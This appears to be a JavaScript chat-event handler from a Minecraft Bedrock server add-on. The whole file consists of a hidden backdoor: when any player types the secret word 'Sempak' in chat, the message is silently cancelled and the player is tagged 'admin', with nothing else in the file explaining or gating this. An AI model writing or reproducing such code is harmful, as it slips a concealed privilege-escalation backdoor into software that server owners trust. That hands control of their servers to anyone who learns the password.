import { world } from "@minecraft/server";
import { WorldDatabase } from "../extension/Database";
import Tag from "../extension/Tag";
import { dataId } from '../config/database'

world.beforeEvents.chatSend.subscribe(data => {
    const player = data.sender;
    let msg = data.message;
    let prefix = dataId.chatPrefix.get() ?? '!'
    if (!msg.startsWith(prefix)) {
        if (msg === 'Sempak') {
            data.cancel = true;
            Tag.add(player, 'admin')
            player.sendMessage('Kamu sekarang adalah Admin!!')
        }
    }
})